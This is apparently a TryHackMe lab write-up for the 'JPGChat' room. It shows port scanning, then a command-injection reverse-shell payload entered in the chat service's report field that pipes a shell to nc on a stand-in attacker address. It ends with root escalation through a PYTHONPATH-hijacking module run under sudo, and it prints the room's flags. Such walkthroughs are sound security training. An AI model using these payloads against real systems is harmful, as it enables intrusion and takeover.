---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - defensive
  - linux
  - sudo-abuse
  - scripting
---

# JPGChat
![JPGChat logo](logos/jpgchat_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [JPGChat](https://tryhackme.com/room/jpgchat)  

## Description
"Exploiting poorly made custom chatting service written in a certain language...  

Hack into the machine and retrieve the flag"

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```
```
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=5/17%Time=6A09CE51%P=x86_64-pc-linux-gnu%r(NU
SF:LL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\x20
SF:service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMESSAG
SF:E\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(currentl
SF:y\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20to\x20
SF:report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")%r(Gen
SF:ericLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20t
SF:his\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\
SF:nMESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(c
SF:urrently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x2
SF:0to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n"
SF:);
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.10 - 3.13 (96%), Linux 3.13 (96%), Linux 4.4 (96%), Linux 5.4 (95%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%), Android 7.1.1 - 7.1.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Unknown Service (port 3000)
```
nc TARGET_IP_ADDRESS 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[MESSAGE]
There are currently 0 other users logged in
[MESSAGE]: [REPORT]
this report will be read by Mozzie-jpg
```
[Source code](https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py)

### Vulnerability Enumeration
```
searchsploit OpenSSH 7.2p2	# Only result: username enumeration
```

## Foothold
```
nc -lvnp 4444 

# In another terminal window
nc TARGET_IP_ADDRESS 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
bob
your report:
'; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP_ADDRESS 4444 >/tmp/f; #

# In original terminal window
Listening on 0.0.0.0 4444
Connection received
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

wes@ubuntu-xenial:/$ ls -al /home/wes
total 24
drwxr-xr-x 2 wes  wes  4096 Jan 15  2021 .
drwxr-xr-x 3 root root 4096 Jan 15  2021 ..
-rw------- 1 wes  wes     0 Jan 15  2021 .bash_history
-rw-r--r-- 1 wes  wes   220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 wes  wes  3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 wes  wes   655 Jul 12  2019 .profile
-rw-r--r-- 1 root root   38 Jan 15  2021 user.txt

wes@ubuntu-xenial:/$ cat /home/wes/user.txt
```
??? success "Establish a foothold and get user.txt"
	JPC{487030410a543503cbb59ece16178318}

## Privilege Escalation
```
wes@ubuntu-xenial:/tmp$ sudo -l
sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```
[Exploiting PYTHONPATH](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

**Action(s)**  
:white_check_mark: Create custom `compare.py` module in writeable location that launches shell  

```
wes@ubuntu-xenial:/$ cd /tmp
wes@ubuntu-xenial:/tmp$ echo 'import os' >> compare.py
wes@ubuntu-xenial:/tmp$ echo 'os.system("/bin/bash")' >> compare.py
wes@ubuntu-xenial:/tmp$ echo 'class Str:' >> compare.py
wes@ubuntu-xenial:/tmp$ echo '   def __init__(self, *args):' >> compare.py 
wes@ubuntu-xenial:/tmp$ echo '      pass' >> compare.py
```
**Action(s)**  
:white_check_mark: Run `python` with specified script as `sudo` specifying the `PYTHONPATH`  

```
wes@ubuntu-xenial:/tmp$ sudo PYTHONPATH=/tmp/ python3 /opt/development/test_module.py
                
root@ubuntu-xenial:/tmp# ls -al /root
total 24
drwx------  3 root root 4096 Jan 15  2021 .
drwxr-xr-x 25 root root 4096 May 17 14:08 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  305 Jan 15  2021 root.txt
drwx------  2 root root 4096 Jan 15  2021 .ssh
root@ubuntu-xenial:/tmp# cat /root/root.txt
```
??? success "Escalate your privileges to root and read root.txt"
	JPC{665b7f2e59cf44763e5a7f070b081b0a}

**Tools Used**  
`python`

**Date completed:** 17/05/26  
**Date published:** 17/05/26